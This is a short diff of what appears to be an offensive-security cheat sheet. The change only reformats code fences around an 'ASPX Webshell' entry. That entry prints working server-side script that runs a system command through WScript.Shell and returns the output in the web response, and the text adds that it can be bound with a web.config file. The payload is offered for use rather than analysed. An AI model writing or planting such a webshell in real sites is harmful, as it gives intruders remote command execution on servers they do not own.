@@ -33,11 +33,13 @@ Try Sweetuu : ```github.com/cspshivam/sweetuu```
 # ASPX Webshell
 
 #### Execute Command
-```<%
+```
+<%
 Set rs = CreateObject("WScript.Shell")
 Set cmd = rs.Exec("cmd /c whoami")
 o = cmd.StdOut.Readall()
 Response.write(o)
-%>```
+%>
+```
 
 This shell can be binded with ```web.config``` file
